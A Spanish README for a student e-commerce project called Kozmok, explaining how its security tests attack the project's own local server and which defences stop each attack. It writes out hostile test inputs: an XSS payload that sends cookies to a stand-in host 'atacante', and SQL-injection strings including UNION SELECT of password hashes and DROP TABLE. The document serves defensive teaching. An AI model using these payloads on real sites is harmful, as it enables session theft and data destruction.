# Seguridad de Kozmok (Etapa 5)

Guía para la **defensa**: qué ataques se prueban, cómo se hacen contra nuestro propio servidor y qué defensa los detiene. Todo se puede demostrar en vivo con los scripts de `kozmok/pruebas-seguridad/` o a mano con el navegador, `curl` o Postman.

> Los ataques se hacen **solo contra nuestro propio servidor**: en la misma computadora (`http://localhost:3000`) o en la red local, por ejemplo por Wi-Fi o por el hotspot de un celular (`http://192.168.x.x:3000`). Los scripts se niegan a atacar cualquier otra dirección si no se les pasa `--objetivo-propio`.

## Resumen

| Ataque | Qué intenta el atacante | Qué lo detiene | Dónde se ve |
|---|---|---|---|
| **Fuerza bruta** | Probar muchas contraseñas hasta atinarle | Bloqueo de la cuenta tras 5 fallos (15 min), bloqueo de IP tras 20 fallos (30 min), máximo 15 intentos por minuto, retraso progresivo, bcrypt | Panel → Cuenta → **Seguridad** (Intentos y Bloqueos) |
| **Bots que prueban contraseñas** | Automatizar logins, registros y recuperaciones | Google reCAPTCHA en login, registro y recuperar contraseña | Seguridad → Eventos (“Captcha”) |
| **Contraseña robada o adivinada** | Entrar con la contraseña correcta de otra persona | Verificación en dos pasos (app autenticadora o código por correo): obligatoria en el panel, opcional en la tienda | Seguridad → Eventos (“Verificación en dos pasos”) |
| **Relleno de credenciales** | Una contraseña filtrada contra muchas cuentas | Límite por conexión y bloqueo de IP | Seguridad → Intentos (IPs con más fallos) |
| **Robo de sesión** | Copiar la cookie y usarla en otro navegador | Cookie HttpOnly + SameSite=Strict, token aleatorio guardado como hash, sesión atada al navegador, vencimiento, revocación al salir | Seguridad → Eventos (“Sesión robada”) |
| **Token falsificado** | Fabricar el token (la versión anterior usaba Base64 `cliente:1:…`) | Tokens aleatorios de 256 bits validados contra la tabla `sesiones` | Seguridad → Eventos (“Token falso”) |
| **Robo de credenciales por XSS** | Meter `<script>` o `<img onerror>` para leer la cookie | Limpieza de HTML en toda entrada, escape al mostrar, CSP `connect-src 'self'`, cookie HttpOnly | Seguridad → Eventos (“XSS”) |
| **Robo de la base de datos** | Llevarse la tabla de clientes | Contraseñas con bcrypt; sesiones y enlaces de recuperación solo como hash SHA-256 | — |
| **Inyección SQL** | `' OR '1'='1`, `UNION SELECT`, `; DROP TABLE` | Consultas parametrizadas en todo el servidor + filtro que bloquea y registra + ids numéricos validados + errores de la base ocultos | Seguridad → Eventos (“Inyección SQL”) |
| **CSRF** | Que otro sitio mande una petición con la sesión de la víctima | Cookie SameSite=Strict y verificación del `Origin` | Seguridad → Eventos (“CSRF”) |
| **IDOR** | Cambiar el id de la URL para ver datos de otro cliente | Cada ruta compara el id con el de la sesión | Seguridad → Eventos (“Acceso a datos ajenos”) |
| **Encontrar el panel** | Escribir `/admin/login.html` (o variantes) para llegar al login del equipo y atacarlo | Panel en una dirección secreta (`PANEL_RUTA`); `/admin/...` da el mismo 404 que una dirección inventada; sin sesión ninguna pantalla del panel se entrega | Seguridad → Eventos (“Intento de abrir el panel por su dirección pública”) |
| **Ingeniería social en soporte** | Pedir (o que alguien escriba) contraseñas, tarjeta completa, CVV o códigos en un ticket | El servidor rechaza respuestas del equipo que piden esos datos (y la pantalla avisa mientras se escribe) y oculta tarjetas (si pasan la prueba de Luhn, deja los últimos 4), CVV, NIP y contraseñas antes de guardar (`public/js/datos-sensibles.js`); el cliente solo recibe los campos públicos de su ticket | El mensaje queda guardado con `[tarjeta ****1234]` / `[oculto]` |
| **Robo de rol** | Cambiar el rol guardado en el navegador (p. ej. Logística → admin) para abrir pantallas de otro rol | El servidor valida el rol de la sesión en cada pantalla y en cada llamada a la API; el rol del navegador no cuenta | Regresa a su inicio; la API responde 403 |

## Cómo correr las pruebas

### Antes de la primera vez: cuenta de prueba

La base no trae clientes de ejemplo, así que las pruebas necesitan una cuenta de **cliente** creada en la tienda solo para esto:

1. En la tienda, *Crear cuenta* con un correo al que tengas acceso (llega un código para confirmarlo). Con Gmail sirve agregar `+pruebas`: `tucorreo+pruebas@gmail.com` llega a tu bandeja normal y la tienda la toma como otra cuenta.
2. **No** le actives la verificación en dos pasos (los scripts no pueden escribir el código).
3. Agrégala una vez al `.env` (junto a `server.js`):

```
PRUEBA_CORREO=tucorreo+pruebas@gmail.com
PRUEBA_PASSWORD=LaContraseñaDeEsaCuenta
```

También se puede pasar en cada corrida: `npm run prueba:seguridad -- --correo=… --password=…` (en PowerShell, si la contraseña lleva `#`, `$` o `&`, va entre comillas simples).

No uses tu cuenta de cliente de siempre: la prueba de fuerza bruta la bloquea a propósito (los scripts la desbloquean al terminar).

### Antes de una demostración: empezar en limpio

```bash
npm run desbloquear -- --todo
```

Levanta los bloqueos **y borra la bitácora de intentos y eventos**. Sirve por dos cosas:

- El bloqueo cuenta los intentos fallidos de los **últimos 15 minutos**. Si acabas de correr las pruebas, esos fallos siguen contando aunque hayas desbloqueado, y en la siguiente corrida la cuenta se bloquea antes (el primer intento ya dice “Te quedan 3” en vez de 4). Con `--todo` la demo muestra la secuencia completa desde cero.
- El panel, *Cuenta → Seguridad*, queda vacío y solo aparece lo que se ataque durante la demo.

`npm run desbloquear` (sin `--todo`) solo levanta los bloqueos y conserva el historial.

### Correr las pruebas

Con el servidor encendido (`npm start` dentro de `kozmok/`), en otra terminal:

```bash
cd kozmok
```

```bash
npm run prueba:seguridad
```

Antes de empezar levanta bloqueos viejos y comprueba que la cuenta de prueba entra; si no puede, dice por qué (contraseña equivocada, verificación en dos pasos activada, cuenta bloqueada o captcha) y no corre nada, para no dar resultados falsos. Luego corre las tres pruebas en orden y al final levanta los bloqueos que quedaron. Cada línea dice **✔ DEFENDIDO** o **✘ VULNERABLE**. También se pueden correr por separado:

```bash
npm run prueba:fuerza-bruta
```

```bash
npm run prueba:sqli
```

```bash
npm run prueba:sesion
```

Después de una demostración, para quitar bloqueos de cuentas e IPs (por ejemplo si la IP de la computadora quedó bloqueada):

```bash
npm run desbloquear
```

`npm run desbloquear -- --todo` además borra la bitácora (ver *Antes de una demostración*).

**Con reCAPTCHA activado** (llaves en `.env`): al arrancar, el servidor genera un pase de pruebas en `kozmok/.pruebas-token` (fuera de git). Los scripts lo usan solo si corren en la misma computadora del servidor, y el servidor solo lo acepta desde ahí; así se prueban el bloqueo de cuentas y las sesiones sin marcar la casilla. Desde cualquier otra computadora el captcha se sigue pidiendo.

### Atacar por Wi-Fi desde otra computadora (más realista)

Así el ataque viaja por la red, como el de un atacante de verdad, y en el panel se ve la IP de la computadora atacante.

1. **Servidor:** conecta su computadora a una red Wi-Fi o al **hotspot de un celular** (sirve con los datos móviles: la red local la crea el celular) y corre `npm start`. La consola muestra la dirección, por ejemplo `http://192.168.43.20:3000`. En Windows permite Node.js en *Redes privadas* cuando salga el aviso del Firewall.
2. **Atacante:** otra computadora conectada a **la misma red**, con Node.js 18+ y una copia del repositorio (no hace falta `npm install`). Dentro de `kozmok/`:

```bash
node pruebas-seguridad/todas.js http://192.168.43.20:3000
```

(o cada una: `node pruebas-seguridad/1-fuerza-bruta.js http://192.168.43.20:3000 --ip`).

Si el servidor tiene reCAPTCHA activado, desde la otra computadora el captcha frena los inicios de sesión antes que el bloqueo de cuentas. Para mostrar el bloqueo en la demo por Wi-Fi, quita `RECAPTCHA_SITE_KEY` y `RECAPTCHA_SECRET_KEY` del `.env` del servidor y reinícialo (vuelve a ponerlas al terminar).

3. **Proyector:** en la computadora del servidor abre el panel → *Cuenta → Seguridad*: aparecen los intentos, el bloqueo de la cuenta (y de la IP con `--ip`), la inyección SQL y la sesión robada, con la IP del atacante.

Desde la otra computadora no se puede tocar la base del servidor, así que la comprobación "si se roban la base de datos" se omite y los bloqueos no se levantan solos: al terminar, corre `npm run desbloquear` en el servidor o usa **Desbloquear** en *Seguridad → Bloqueos*.

> Solo funciona dentro de la misma red. Desde internet (otro celular con sus datos móviles, fuera del hotspot) no se llega al servidor: la compañía telefónica no deja entrar conexiones a los celulares, y abrir el servidor a internet no es parte de la demo.

## 1. Fuerza bruta

**Ataque.** `pruebas-seguridad/1-fuerza-bruta.js` prueba un diccionario de contraseñas contra la cuenta de prueba; la contraseña correcta va al final. Antes comprueba que la respuesta es la misma para un correo registrado y uno inexistente, y al final que un correo que no existe también se “bloquea” tras los mismos intentos (el bloqueo no delata qué cuentas existen). Con `--ip` también hace *relleno de credenciales*: la misma contraseña contra 25 cuentas.

```bash
npm run prueba:fuerza-bruta -- --ip
```

**Qué se ve.** Los primeros intentos regresan 401 y avisan cuántos quedan; el 5º responde **429: cuenta bloqueada 15 minutos**, y aunque después llegue la contraseña correcta, **no entra**. En la ráfaga contra muchas cuentas aparece el límite por minuto (429) y la IP queda bloqueada.

**A mano.** En `/login.html` escribe 5 veces mal la contraseña de una cuenta: el mensaje cambia a “Cuenta bloqueada temporalmente…”. En el panel, *Seguridad → Bloqueos*, aparece el bloqueo con el botón **Desbloquear**.

**Defensas (en `kozmok/seguridad.js`).**
- `registrarFallo`: cada intento queda en `intentos_login`; con 5 fallos seguidos de una cuenta se crea un registro en `bloqueos` (tipo cuenta) y con 20 desde una IP, otro (tipo IP).
- `limitador`: máximo 15 peticiones por minuto por IP a login, registro y recuperación (en memoria).
- Retraso progresivo de 250 ms por fallo y bcrypt (costo 12) hacen lento cada intento.
- `compararPassword` usa un hash de relleno cuando el correo no existe: misma respuesta y mismo tiempo, así no se puede saber qué correos están registrados.
- Política de contraseñas (8+ caracteres, mayúsculas y minúsculas, número, símbolo, no de las más comunes, sin el correo ni el nombre).

Los límites se ajustan en `.env`: `MAX_FALLOS_CUENTA`, `MAX_FALLOS_IP`, `BLOQUEO_CUENTA_MIN`, `BLOQUEO_IP_MIN`.

## 2. Robo de credenciales y de sesión

**Ataque.** `pruebas-seguridad/3-robo-de-sesion.js`:
1. Fabrica un token Base64 `cliente:1:…` (con la versión anterior eso bastaba para entrar a cualquier cuenta).
2. Inicia sesión como la víctima, copia su cookie `kz_sesion` y la usa con otro navegador.
3. Cierra sesión y vuelve a usar la cookie copiada.
4. Manda un ticket con `<img src=x onerror="fetch('https://atacante/?c='+document.cookie)">`.
5. Manda una recarga del monedero con `Origin: https://sitio-malicioso`.
6. Pide el perfil, el carrito y los pedidos de otro cliente.
7. Lee la base: la contraseña solo está como hash bcrypt.

**Qué se ve.** Todo regresa 401/403. En el paso 2, además, **la sesión de la víctima se revoca**: el servidor asume que la cookie fue robada.

**A mano (robo de cookie).** Inicia sesión en Chrome, abre las herramientas de desarrollador → Application → Cookies y copia `kz_sesion`. En la consola escribe `document.cookie`: la cookie **no aparece** (HttpOnly). Pégala en otro navegador o en Postman con otro User-Agent: responde 401 y en *Seguridad → Eventos* aparece “Sesión robada”.

**Defensas.**
- La sesión es un token aleatorio de 256 bits en una cookie `HttpOnly; SameSite=Strict` (y `Secure` con `COOKIE_SEGURA=1` en HTTPS). En `localStorage` ya no hay tokens.
- En la tabla `sesiones` solo está el **hash SHA-256** del token; con una copia de la base no se pueden usar.
- Cada sesión guarda el navegador que la abrió y **cómo** se abrió (contraseña, contraseña + dos pasos, QR, registro). Si a media sesión llega con otro navegador, se compara (`compararNavegador` en `seguridad.js`):
  - **Actualización** (mismo navegador, sistema y dispositivo, versión más nueva): normal; la sesión sigue y se guarda el navegador nuevo (evento `navegador_actualizado`, normal).
  - **Modo de dispositivo de las herramientas de desarrollador** (misma IP, una computadora con Chrome/Edge/Opera que de pronto dice ser celular; al emular un iPhone se presenta como Safari): la sesión sigue y se anota una vez cada 30 min (`sesion_emulacion`, baja). Antes esto se tomaba como robo y cerraba la sesión.
  - **Cualquier otra cosa** (otro navegador, una versión anterior, otra IP, `curl`…): se trata como robo, se cierra y queda `sesion_robada` (alta).
- Una pestaña vieja que sigue mandando una sesión ya cerrada se anota **una vez cada 15 min** por sesión (antes, una por petición).
- Cada evento guarda **detalles** (`eventos_seguridad.datos`): la petición (IP, red —esta computadora, red local o internet—, navegador legible, ruta, página de origen), la sesión (cuándo y cómo se abrió, última IP, navegador al abrir, motivo del cierre), qué cambió y un **veredicto** (dentro o fuera de lo normal, con la explicación). En el inicio con QR: qué computadora lo pidió y qué celular lo aprobó. En el panel, clic en el evento para verlos.
- Vencen (7 días la tienda, 8 h el panel), se cierran por inactividad (2 días / 2 horas), se revocan al cerrar sesión, al cambiar o restablecer la contraseña. El cliente ve y cierra sus sesiones en **Mi cuenta → Seguridad**.
- Recuperación de contraseña con enlace de un solo uso que vence en 30 min, sin revelar si el correo existe.
- Contra XSS: `sanitizarEntrada` quita etiquetas y caracteres peligrosos de todo lo que entra (menos contraseñas), las pantallas escapan con `escHTML()` lo que muestran, y la cabecera **CSP** con `connect-src 'self'` impide que un script mande datos a otro servidor. También `X-Frame-Options: DENY`, `nosniff` y `Referrer-Policy`.
- Contra CSRF: cookie `SameSite=Strict` y `verificarOrigen` rechaza peticiones que modifican datos desde otro origen.
- Contra IDOR: `mismoCliente` y las consultas con `AND cliente_id = $2`; el detalle de pedidos, que antes era público, ahora exige sesión y ser el dueño.

## 3. Inyección SQL

**Ataque.** `pruebas-seguridad/2-inyeccion-sql.js` prueba:
- Login con `admin@kozmok.mx' OR '1'='1' --` y contraseñas con `' OR '1'='1`.
- Buscador con `' UNION SELECT id, email, password_hash FROM usuarios --`, `'; DROP TABLE clientes; --` y `' AND pg_sleep(5) --`.
- Ids en la URL: `/api/catalogo/1 OR 1=1`, `/api/catalogo/1;DROP TABLE productos`.
- `ORDER BY` manipulado.

**Qué se ve.** El filtro responde **400: “se detectó un intento de inyección SQL”** y lo registra. Al final la prueba confirma que el catálogo sigue completo.

**Demostrar que la defensa real son las consultas parametrizadas.** Arranca el servidor con el filtro solo registrando:

```bash
FILTRO_SQLI=registrar npm start
```

(en Windows pon `FILTRO_SQLI=registrar` en el archivo `.env`). Vuelve a correr `npm run prueba:sqli`: ahora el buscador responde 200 con **cero resultados** (el texto se buscó literalmente), el login responde “formato no válido” y nada se borra. Ningún dato interno ni error de PostgreSQL llega al atacante.

**Defensas.**
- **Consultas parametrizadas**: en `server.js` todo valor del usuario va como `$1, $2…` en `pool.query(sql, [valores])`. Lo único que se arma con texto son condiciones con marcadores y valores de listas blancas (por ejemplo, el `ORDER BY` del catálogo solo puede ser por nombre o por novedades: cualquier otro valor se ignora).
- `filtroInyeccionSQL`: detecta tautologías, `UNION SELECT`, consultas apiladas, comentarios, `pg_sleep`, lectura de `information_schema`, etc.
- `app.param`: todo `:id` debe ser numérico.
- `asyncRoute` y `mensajeSeguro`: el error de la base nunca se manda al cliente (antes la respuesta incluía `detalle: err.message`).
- Validación de formatos (correo, teléfono, montos, fechas) antes de consultar.

## 4. Fraude interno y de clientes (control interno)

Las reglas viven en `kozmok/db/control_interno.sql` (se aplica solo al arrancar) para
que se cumplan aunque alguien llame a la API directo o tenga acceso a la base:

- **Fecha del servidor**: pedidos y movimientos de puntos, monedero y ERP guardan
  `CURRENT_TIMESTAMP`; la fecha que mande el cliente o el empleado se ignora.
- **Inventario: dos fechas**. `fecha` = hora real del registro (servidor, inmutable) y
  `fecha_movimiento` = cuándo dice el empleado que pasó (se puede indicar al registrar y
  corregir con motivo). Cada corrección queda en `movimientos_inventario_fechas` (anterior,
  nueva, quién, por qué, hora real), tabla de solo agregar. No se aceptan fechas futuras ni
  de más de un año. Un empleado solo corrige sus propios movimientos.
  **La hora real y el historial no se muestran en el panel ni salen por la API**: quedan
  solo en la base para revisar incoherencias, por ejemplo:

  ```sql
  -- Movimientos capturados 1 día o más después de la fecha que dicen, o con fecha corregida
  SELECT m.id, p.nombre, m.tipo, m.cantidad, m.fecha_movimiento, m.fecha AS registrado,
         u.nombre AS registro, uc.nombre AS corrigio_fecha, m.fecha_cambiada_en
  FROM movimientos_inventario m
  JOIN productos p ON p.id = m.producto_id
  LEFT JOIN usuarios u ON u.id = m.usuario_id
  LEFT JOIN usuarios uc ON uc.id = m.fecha_cambiada_por
  WHERE m.fecha - m.fecha_movimiento >= INTERVAL '1 day' OR m.fecha_cambiada_por IS NOT NULL
  ORDER BY m.fecha DESC;

  -- Historial de correcciones de fecha
  SELECT f.*, u.nombre FROM movimientos_inventario_fechas f
  LEFT JOIN usuarios u ON u.id = f.usuario_id ORDER BY f.fecha DESC;
  ```
- **Solo agregar**: los movimientos no se editan ni se borran; un error se corrige con
  un movimiento compensatorio. Solo cambia el estado de un pendiente.
- **Pedidos sellados**: folio, fecha y montos inmutables; estados solo hacia adelante;
  entregado y cancelado son finales; un pago registrado no se deshace.
- **Bitácora encadenada** (`auditoria`): quién, cuándo, antes y después, con huella
  SHA-256 que incluye la del registro anterior. Panel → Auditoría → *Verificar integridad*.
- **Segunda firma**: bajas de inventario ≥ `BAJA_UMBRAL_PIEZAS` / `BAJA_UMBRAL_VALOR` o
  por robo, ajustes de monedero > `MONEDERO_AJUSTE_UMBRAL`, confirmación de pagos manuales
  (folio único, quien captura no confirma).
- **Clientes**: puntos negativos al cancelar un pedido cuyos puntos ya se usaron, máximo de
  piezas por producto y de pedidos sin pagar, límites del monedero (por operación, día, mes,
  saldo máximo), correo verificado para recargar, estados activo/congelado/bloqueado con motivo.

Los casos de fraude (empleados E1–E10, clientes C1–C9) y su cláusula están en el documento
del proyecto; las reglas para el cliente en la tienda, `terminos.html`.

## 5. Panel oculto y robo de roles

**Ataque.** Quien conoce el proyecto sabe que el panel estaba en `/admin/login.html`: con solo agregar eso a la dirección llegaba al login del equipo para probar contraseñas. Y quien ya trabaja en el panel (por ejemplo, Logística) puede abrir las herramientas del navegador, cambiar su rol a `admin` en `localStorage` (`kz_usuario`) y escribir la dirección de una pantalla que no le toca, como *Cuentas y equipo*.

**Qué se ve.**
- `/admin/login.html`, `/admin/LOGIN.HTML`, `/admin/%6Cogin.html`, `/admin/js/../login.html`, `/admin/` y cualquier otra dirección bajo `/admin` responden **la misma página 404** que una dirección inventada: no se puede saber que el panel existe. Cada intento de abrir el login por su dirección conocida queda en *Seguridad → Eventos*.
- La entrada real es `http://localhost:3000/<PANEL_RUTA>/login.html`. La consola la muestra al arrancar; si el `.env` no trae `PANEL_RUTA`, el servidor inventa una al azar (`kz-` + 16 caracteres) y la guarda en `.panel-ruta` (no se sube a GitHub).
- Dentro de esa ruta, una pantalla del panel sin sesión manda al login (`…/login.html?next=…`) y, después de entrar, abre la pantalla pedida. Con el rol cambiado en el navegador, el servidor revisa el rol **de la sesión** y regresa a la persona a su inicio; la API responde 403 y el menú vuelve a su rol real al recargar.

**A mano.**
```bash
curl -i http://localhost:3000/admin/login.html                 # 404, igual que /no-existe.html
curl -i http://localhost:3000/<PANEL_RUTA>/login.html          # 200: la entrada del equipo
curl -i http://localhost:3000/<PANEL_RUTA>/dashboard.html      # 302 al login (sin sesión)
```

**Defensas.**
- `panel.js` va **antes** de los archivos estáticos: la carpeta `public/admin` no se sirve directo. Sirve el panel bajo la ruta secreta y, al entregarlo, cambia los enlaces `/admin/...` de las pantallas, de las respuestas de `/api/admin` y de los correos por la ruta secreta. La ruta se revisa como la entendería el servidor de archivos (decodificada, sin `..`, sin distinguir mayúsculas, como en Windows), así que las variantes no se cuelan.
- Cada pantalla (menos las de acceso: login, recuperar, restablecer y activar) pide una sesión válida del equipo y la misma clave de permiso que usa el menú (`renderAdminSidebar('…')`); el servidor la valida con `permisos.js` contra el rol guardado en la base, no contra lo que diga el navegador. La API ya hacía lo mismo con `PERMISOS_API`.
- Los enlaces de los correos del equipo abren su pantalla aunque la cookie `SameSite=Strict` no viaje al dar clic desde el correo: el servidor manda al login con `?next=` y el login, que sí lleva la cookie, abre la pantalla. `next` solo acepta pantallas de la ruta secreta, nunca otro sitio.
- Las pantallas del panel salen con `X-Robots-Tag: noindex` y `Referrer-Policy: same-origin` evita que la dirección secreta viaje a otros sitios.
- Esconder la entrada no reemplaza a las demás defensas: el login del panel sigue con bloqueo por intentos, captcha y verificación en dos pasos.

## 6. Iniciar sesión con QR (tienda) y "QR ajeno"

**Cómo funciona.** En el login de la tienda, *Entrar con mi celular* muestra un QR y dos dígitos. Un celular con la sesión ya iniciada lo escanea (`qr.html`), ve desde qué navegador y conexión se pide, y elige entre tres números el que aparece en la computadora. La computadora pregunta cada 2 s y, aprobado, recibe su propia sesión (cookie `HttpOnly` como siempre).

**Ataque.** El típico contra este tipo de login: alguien abre el login en *su* computadora y te manda (o te enseña) su QR con un pretexto ("escanéalo para tu cupón"). Si lo apruebas, entra con **tu** cuenta. Otro intento: adivinar o reutilizar un QR para robarse la sesión.

**Defensas.**
- El QR lleva un código; la sesión solo se entrega a quien también tiene el **secreto** que recibió la computadora al pedir el QR (nunca está en el QR). En la base solo quedan huellas SHA-256 de los dos.
- **Coincidencia de números**: el celular no muestra el número correcto, ofrece tres. Si se elige uno que no es el de la pantalla, el QR se cancela y queda el evento `qr_numero_erroneo`. Quien te mandó su QR tendría que convencerte, además, de qué número elegir.
- El celular muestra navegador, sistema y conexión de la computadora (y si es la misma red), con el aviso "si alguien te mandó este código, no lo apruebes", y el botón **No fui yo** (evento `qr_rechazado`).
- Vence en **2 minutos**, se usa **una vez** (se marca `usado` antes de abrir la sesión, así dos consultas juntas no reciben dos sesiones) y el primer celular que lo abre se queda con él: otra cuenta ya no puede aprobarlo.
- Solo para clientes de la tienda (el panel no lo tiene: ahí sigue la contraseña y los dos pasos). El acceso queda en *Inicios de sesión* del cliente como "Acceso con QR desde tu celular", la sesión nueva en sus dispositivos conectados (la puede cerrar) y los eventos en *Seguridad → Eventos*.
- Límites: crear QR cuenta en el límite de login (15/min por IP) y la consulta de estado tiene el suyo (60/min).

**A mano.**
```bash
curl -s -X POST localhost:3000/api/auth/qr -H 'Content-Type: application/json' -d '{}'
# -> {codigo, secreto, digitos, url, expira_en}
curl -s -X POST localhost:3000/api/auth/qr/estado -H 'Content-Type: application/json' -d '{"codigo":"…","secreto":"otro"}'   # 404
```

## 7. Espiar la red (sniffing) y HTTPS

**Ataque.** Con HTTP todo viaja en texto plano: cualquiera en el camino (otra máquina en un Wi-Fi público, el router, quien controle la red) puede leer la contraseña del login, la cookie de sesión y los datos de la compra con un programa como **Wireshark**.

**Defensa.** HTTPS (TLS): la conexión va cifrada y el navegador comprueba que el certificado sea del servidor correcto.
- `npm run certificado` usa **mkcert** para crear una autoridad local (se instala en esta computadora) y un certificado para `localhost`, `kozmok.local` y las IPs actuales (`certs/`, no se sube a GitHub).
- Con el certificado, el servidor abre también el **443** (si está ocupado, el 3443) y **las páginas pedidas por http se mandan a https**. La cookie de sesión sale con `Secure` (nunca viaja por http).
- La API no se redirige (para no romper nada a medio hacer ni las pruebas de ataque por http).
- Celulares: instalar una vez `http://kozmok.local/kozmok-ca.crt` (la parte pública de la autoridad; la llave no sale de la computadora). Sin instalarlo abren con el aviso de "no seguro".
- HSTS solo en producción (`COOKIE_SEGURA=1` o `HSTS=1`): en la red local amarraría `localhost`/`kozmok.local` a https por un año y no se podría repetir la demostración.

**Demostración (antes y después).**
1. Instala [Wireshark](https://www.wireshark.org/) en la computadora del servidor.
2. **Antes:** en el `.env` pon `HTTPS=no` y reinicia. En Wireshark captura la interfaz **Wi-Fi** con el filtro `http.request.method == "POST"`.
3. Desde un **celular** (misma red) abre `http://<IP>/login.html` e inicia sesión. En Wireshark aparece `POST /api/auth/login`: clic derecho → *Follow → HTTP Stream* y se lee el correo y la **contraseña** en texto plano, y la cookie `kz_sesion` en las respuestas.
4. **Después:** quita `HTTPS=no` (o pon `HTTPS=si`) y reinicia; la consola dice "HTTPS: activo". Repite el login desde el celular (ya con el certificado instalado). En Wireshark, con el filtro `tls`, solo se ve *Application Data* cifrado; `http.request` ya no muestra nada.
5. Si repites la demo en el mismo navegador: después de usar https, borra las cookies del sitio antes de volver a http (el navegador no deja que http reemplace una cookie `Secure`).

> En la computadora misma se puede capturar la interfaz *Loopback* (Npcap) entrando por `http://localhost`, pero desde el celular es más claro: es lo que vería alguien en la red.

## 8. Averiguar qué correos tienen cuenta (enumeración)

**Ataque.** Probar correos en el registro para saber cuáles son clientes (y luego atacarlos con phishing o contraseñas filtradas). Antes, el registro respondía "Este correo ya está registrado".

**Defensa** (con Gmail configurado). La cuenta se crea **hasta confirmar el correo**:
- `POST /api/auth/registro-cliente` responde **siempre igual** (202, "Te enviamos un código…"), exista o no una cuenta con ese correo, y tarda lo mismo (bcrypt en los dos casos).
- Correo nuevo: le llega el código; al escribirlo (`POST /api/auth/registro/confirmar`) se crea la cuenta ya confirmada y entra.
- Correo que ya tiene cuenta: al dueño le llega "Alguien intentó crear una cuenta con tu correo" (máximo uno cada 30 min) y **ningún código sirve**: el atacante ve exactamente lo mismo que con un correo nuevo.
- Queda el evento `registro_correo_existente` (baja). El login y "¿Olvidaste tu contraseña?" ya respondían igual exista o no el correo.
- Sin Gmail configurado no hay forma de comprobar el correo y el registro funciona como antes (crea la cuenta y dice si el correo ya existe).

**A mano.** Registra un correo que ya tiene cuenta y otro nuevo: las dos pantallas son idénticas; solo el dueño real recibe el aviso.

## Dónde está cada cosa

| Archivo | Qué contiene |
|---|---|
| `kozmok/seguridad.js` | Cabeceras/CSP, límites, bloqueos, sesiones, filtros SQL y XSS, política de contraseñas |
| `kozmok/panel.js` | Panel en la dirección secreta (`PANEL_RUTA`), traducción de enlaces y pantallas solo con sesión y rol |
| `kozmok/server.js` | Rutas `/api/auth/*`, uso de los middlewares, rutas del panel `/api/admin/seguridad/*` |
| `kozmok/db/database.sql` | Tablas `sesiones`, `intentos_login`, `bloqueos`, `eventos_seguridad`, `recuperaciones`, `correos_salida` |
| `kozmok/public/admin/seguridad.html` | Tablero (Panel → Cuenta → Seguridad, solo administrador): eventos, intentos, bloqueos, sesiones activas y correos enviados |
| `kozmok/public/seguridad.html` | Seguridad de la cuenta del cliente: contraseña, sesiones y actividad |
| `kozmok/public/qr.html` | Aprobar desde el celular la entrada con QR de una computadora |
| `kozmok/public/recuperar.html`, `restablecer.html` | Recuperar la contraseña con enlace de un solo uso |
| `kozmok/pruebas-seguridad/` | Scripts de los ataques y `desbloquear.js` |
| `kozmok/.env.example` | Contraseña de la base y parámetros de seguridad (el `.env` real no se sube) |

## Limitaciones honestas

- HTTPS local usa una autoridad propia (mkcert): sirve para la red de la clase, no para internet. En producción el certificado lo da una autoridad pública (p. ej. Let's Encrypt) y se activa `COOKIE_SEGURA=1` (cookie `Secure` siempre y HSTS).
- La dirección secreta del panel es una capa extra (oculta la puerta), no la cerradura: la protección real siguen siendo la contraseña, la verificación en dos pasos y los permisos por rol en el servidor. Los scripts de `/admin/js/` siguen siendo públicos porque la página de acceso los necesita antes de iniciar sesión; no traen datos ni la dirección secreta.
- El límite por minuto vive en memoria: se reinicia con el servidor. Los bloqueos de cuenta e IP sí quedan en la base.
- Un atacante puede bloquear a propósito la cuenta de alguien fallando 5 veces (es el costo del bloqueo); por eso dura solo 15 minutos y la persona puede entrar con “¿Olvidaste tu contraseña?”, que además levanta el bloqueo.
- Los correos salen por Gmail solo si se configuran `SMTP_USUARIO` y `SMTP_PASSWORD` en el `.env`; sin eso se guardan en el panel, *Cuenta → Seguridad → Correos enviados* (ahí está el enlace de recuperación durante la demo). La contraseña de aplicación de Gmail vive solo en el `.env`, que no se sube a GitHub.
- "Mantener sesión iniciada" (solo en la tienda) alarga la sesión a 30 días y la exime del cierre por inactividad; sigue atada al navegador que la abrió y se revoca al cerrar sesión o cambiar la contraseña. El panel no la tiene: su cookie es de sesión (se cierra al cerrar la pestaña o el navegador) y solo recuerda el correo de la cuenta, nunca la contraseña.
- La CSP todavía permite scripts escritos dentro del HTML (`'unsafe-inline'`) porque las pantallas los usan. Contra XSS la defensa principal es limpiar lo que entra y escapar lo que se muestra; la CSP evita que un script inyectado mande datos a otro servidor (`connect-src 'self'`). El siguiente paso sería pasar esos scripts a archivos `.js` y quitar `'unsafe-inline'`.
